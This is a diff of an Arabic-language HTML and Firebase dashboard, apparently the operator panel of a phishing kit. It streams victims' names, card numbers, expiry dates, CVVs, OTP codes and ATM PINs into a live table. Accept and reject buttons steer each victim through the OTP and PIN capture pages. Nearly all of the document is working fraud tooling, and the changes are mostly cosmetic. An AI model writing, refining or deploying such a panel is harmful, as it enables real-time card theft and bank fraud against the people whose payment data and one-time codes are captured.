@@ -3,24 +3,23 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>لوحة تحكم العمليات - نظام الرادار</title>
+    <title>لوحة تحكم العمليات</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
     
     <style>
         :root { 
             --main-green: #1e7344; 
-            --bg-gray: #f0f2f5; /* لون رمادي فاتح للخلفية */
-            --card-bg: #ffffff; /* لون أبيض للخلايا والبطاقات */
-            --text-dark: #333333;
+            --bg-gray: #e9ecef; /* خلفية رمادية */
+            --row-bg: #ffffff; 
         }
         
         body { 
-            font-family: 'Segoe UI', sans-serif; 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
             background-color: var(--bg-gray); 
-            color: var(--text-dark); 
             margin: 0; 
-            padding: 15px; 
+            padding: 20px; 
+            color: #333;
         }
         
         .header { 
@@ -31,64 +30,55 @@
             align-items: center; 
             border-bottom: 4px solid var(--main-green); 
             margin-bottom: 20px; 
-            border-radius: 12px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+            border-radius: 10px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
         }
 
-        .stats-box { display: flex; gap: 20px; align-items: center; }
-        .live-indicator {
-            background: rgba(30, 115, 68, 0.1); 
-            border: 1px solid var(--main-green);
-            padding: 8px 18px; 
-            border-radius: 50px; 
-            color: var(--main-green); 
-            font-weight: bold;
-            display: flex; 
-            align-items: center; 
+        .visitor-box {
+            background: #f8f9fa;
+            border: 1px solid #ddd;
+            padding: 10px 20px;
+            border-radius: 50px;
+            display: flex;
+            align-items: center;
             gap: 10px;
+            font-weight: bold;
         }
-        .pulse { width: 12px; height: 12px; background: #2ecc71; border-radius: 50%; animation: pulse-animation 1.5s infinite; }
-        @keyframes pulse-animation { 0% { transform: scale(0.9); opacity: 1; } 50% { transform: scale(1.2); opacity: 0.5; } 100% { transform: scale(0.9); opacity: 1; } }
 
-        .table-container { 
-            width: 100%; 
-            overflow-x: auto; 
-            background: #fff; 
-            border-radius: 15px; 
-            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
-        }
-        
+        .pulse-dot { width: 10px; height: 10px; background: #28a745; border-radius: 50%; animation: pulse 1.5s infinite; }
+        @keyframes pulse { 0% { transform: scale(0.95); opacity: 1; } 70% { transform: scale(1.1); opacity: 0.7; } 100% { transform: scale(0.95); opacity: 1; } }
+
+        .table-wrapper { width: 100%; overflow-x: auto; background: #fff; border-radius: 10px; box-shadow: 0 5px 15px rgba(0,0,0,0.05); }
         table { width: 100%; border-collapse: collapse; min-width: 1200px; }
-        th { background: #f8f9fa; color: #666; padding: 18px; text-align: center; font-size: 13px; border-bottom: 2px solid #eee; }
-        td { padding: 15px; text-align: center; border-bottom: 1px solid #f1f1f1; font-size: 15px; color: #444; }
         
-        /* معالجة رقم البطاقة لعدم الانعكاس */
-        .card-num-cell { 
+        th { background: #f1f3f5; color: #555; padding: 15px; font-size: 13px; text-align: center; border-bottom: 2px solid #dee2e6; }
+        td { padding: 15px; text-align: center; border-bottom: 1px solid #eee; font-size: 14px; vertical-align: middle; }
+
+        /* سطر العميل */
+        .client-row:hover { background-color: #fcfcfc; }
+        
+        /* تنسيق رقم البطاقة لعدم الانعكاس */
+        .card-number { 
             direction: ltr !important; 
-            unicode-bidi: bidi-override; 
-            font-family: 'Courier New', monospace; 
+            display: inline-block;
+            font-family: 'Courier New', Courier, monospace; 
             font-weight: bold; 
-            color: #1e7344; 
+            color: #1e7344;
             letter-spacing: 1px;
-            background: #f9f9f9;
-            padding: 5px;
+            background: #f1f1f1;
+            padding: 4px 8px;
             border-radius: 4px;
         }
-        
-        .page-name { color: #856404; font-size: 11px; font-weight: bold; background: #fff3cd; padding: 5px 10px; border-radius: 20px; border: 1px solid #ffeeba; }
+
+        .badge-page { background: #fff3cd; color: #856404; padding: 4px 10px; border-radius: 15px; font-size: 11px; font-weight: bold; border: 1px solid #ffeeba; }
         .otp-val { color: #d9534f; font-size: 18px; font-weight: bold; }
-        .pin-val { color: #f0ad4e; font-size: 18px; font-weight: bold; }
+        .pin-val { color: #007bff; font-size: 18px; font-weight: bold; }
 
-        .btn { padding: 10px 22px; border: none; border-radius: 8px; font-weight: bold; transition: 0.3s; cursor: pointer; font-size: 13px; }
-        
-        /* الحالة الرمادية */
-        .btn-off { background: #e0e0e0 !important; color: #999 !important; cursor: not-allowed; }
-        
-        /* الحالة النشطة */
-        .btn-accept.active { background: #2ecc71 !important; color: #fff; box-shadow: 0 4px 10px rgba(46, 204, 113, 0.3); }
-        .btn-reject.active { background: #e74c3c !important; color: #fff; box-shadow: 0 4px 10px rgba(231, 76, 60, 0.3); }
-
-        tr:hover { background-color: #fafafa; }
+        /* الأزرار */
+        .btn { padding: 8px 20px; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; transition: 0.2s; font-size: 13px; }
+        .btn-off { background: #ced4da !important; color: #6c757d !important; cursor: not-allowed; }
+        .btn-accept.active { background: #28a745 !important; color: #fff; }
+        .btn-reject.active { background: #dc3545 !important; color: #fff; }
     </style>
 </head>
 <body onload="_init()">
@@ -96,28 +86,28 @@
 <audio id="alert_sound" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3"></audio>
 
 <div class="header">
-    <div class="stats-box">
-        <strong style="font-size: 22px; color: var(--main-green);">نظام إدارة العمليات</strong>
-        <div class="live-indicator">
-            <div class="pulse"></div>
-            <span>العملاء النشطون حالياً: <b id="visitor_count" style="font-size: 22px; margin-right: 5px;">0</b></span>
+    <div style="display: flex; align-items: center; gap: 20px;">
+        <strong style="font-size: 18px;">لوحة الرادار</strong>
+        <div class="visitor-box">
+            <div class="pulse-dot"></div>
+            <span>العملاء النشطون: <span id="live_count" style="color:#28a745; font-size:20px;">0</span></span>
         </div>
     </div>
-    <button onclick="_clear()" style="background:#dc3545; color:white; border:none; padding:10px 20px; border-radius:8px; cursor:pointer; font-weight:bold;">تصفير السجلات</button>
+    <button onclick="_clear()" style="background:#6c757d; color:white; border:none; padding:8px 15px; border-radius:5px; cursor:pointer;">تصفير السجلات</button>
 </div>
 
-<div class="table-container">
+<div class="table-wrapper">
     <table>
         <thead>
             <tr>
                 <th>#</th>
-                <th>الموقع الحالي</th>
-                <th>اسم صاحب البطاقة</th>
-                <th>رقم البطاقة (LTR)</th>
-                <th>تاريخ / CVV</th>
-                <th>رمز الـ OTP</th>
+                <th>الصفحة الحالية</th>
+                <th>اسم العميل</th>
+                <th>رقم البطاقة</th>
+                <th>التاريخ / CVV</th>
+                <th>الرمز (OTP)</th>
                 <th>ATM PIN</th>
-                <th>الإجراء السريع</th>
+                <th>الإجراء</th>
             </tr>
         </thead>
         <tbody id="monitor">
@@ -133,7 +123,7 @@
         if (!firebase.apps.length) firebase.initializeApp(config);
         const db = firebase.database();
 
-        // تحديث العداد الفعلي للزوار النشطين
+        // تحديث عداد الزيارات
         db.ref('orders').on('value', snap => {
             const data = snap.val() || {};
             const now = new Date().getTime();
@@ -141,49 +131,53 @@
             Object.values(data).forEach(item => {
                 if (item.last_update && (now - item.last_update < 60000)) active++;
             });
-            document.getElementById('visitor_count').innerText = active;
+            document.getElementById('live_count').innerText = active;
         });
 
-        // مراقبة وصول البيانات
+        // مراقبة العملاء (البيانات)
         db.ref('orders').on('value', snapshot => {
             const orders = snapshot.val() || {};
             const monitor = document.getElementById('monitor');
             monitor.innerHTML = '';
+            
             const ids = Object.keys(orders).reverse();
 
             ids.forEach((id, index) => {
                 const d = orders[id];
                 const count = ids.length - index;
 
+                // صوت تنبيه عند التغيير
                 const currentStr = JSON.stringify(d);
-                let hasNewMove = false;
+                let hasUpdate = false;
                 if(cache[id] && cache[id] !== currentStr) {
                     document.getElementById('alert_sound').play().catch(()=>{});
-                    hasNewMove = true;
+                    hasUpdate = true;
                 }
                 cache[id] = currentStr;
 
-                // تحديد التوجيه القادم
-                let next = 'go_to_otp';
-                if (d.otp_code || d.otp) next = 'go_to_pin';
-                if (d.atm_pin) next = 'success';
+                // تحديد المسار
+                let nextStep = 'go_to_otp';
+                if (d.otp_code || d.otp) nextStep = 'go_to_pin';
+                if (d.atm_pin) nextStep = 'success';
 
-                // منطق تفعيل الأزرار
-                const canAct = (d.next_step === 'waiting' || hasNewMove);
-                const btnStyle = canAct ? 'active' : 'btn-off';
+                // تفعيل الأزرار
+                const isReady = (d.next_step === 'waiting' || hasUpdate);
+                const btnClass = isReady ? 'active' : 'btn-off';
 
                 const row = `
-                    <tr>
+                    <tr class="client-row">
                         <td><b>${count}</b></td>
-                        <td><span class="page-name">${d.current_page || 'انتظار..'}</span></td>
-                        <td style="font-weight:600;">${d.fullName || '---'}</td>
-                        <td class="card-num-cell">${d.cardNumber || '---'}</td>
-                        <td><span style="background:#eee; padding:2px 6px; border-radius:4px;">${d.expiryDate || '--/--'}</span> | <b>${d.cvv || '---'}</b></td>
+                        <td><span class="badge-page">${d.current_page || 'البداية'}</span></td>
+                        <td>${d.fullName || '---'}</td>
+                        <td><span class="card-number">${d.cardNumber || '---'}</span></td>
+                        <td>${d.expiryDate || '--/--'} | <b>${d.cvv || '---'}</b></td>
                         <td class="otp-val">${d.otp_code || d.otp || '----'}</td>
                         <td class="pin-val">${d.atm_pin || '----'}</td>
                         <td>
-                            <button class="btn btn-accept ${btnStyle}" onclick="${canAct ? `_send('${id}', '${next}')` : ''}">قبول</button>
-                            <button class="btn btn-reject ${btnStyle}" onclick="${canAct ? `_send('${id}', 'wrong_card')` : ''}">رفض</button>
+                            <div style="display:flex; gap:5px; justify-content:center;">
+                                <button class="btn btn-accept ${btnClass}" onclick="${isReady ? `_send('${id}', '${nextStep}')` : ''}">قبول</button>
+                                <button class="btn btn-reject ${btnClass}" onclick="${isReady ? `_send('${id}', 'wrong_card')` : ''}">رفض</button>
+                            </div>
                         </td>
                     </tr>
                 `;
@@ -201,7 +195,7 @@
     }
 
     function _clear() {
-        if(confirm("هل أنت متأكد من مسح جميع السجلات؟")) firebase.database().ref('orders').remove();
+        if(confirm("مسح السجلات؟")) firebase.database().ref('orders').remove();
     }
 </script>
 </body>
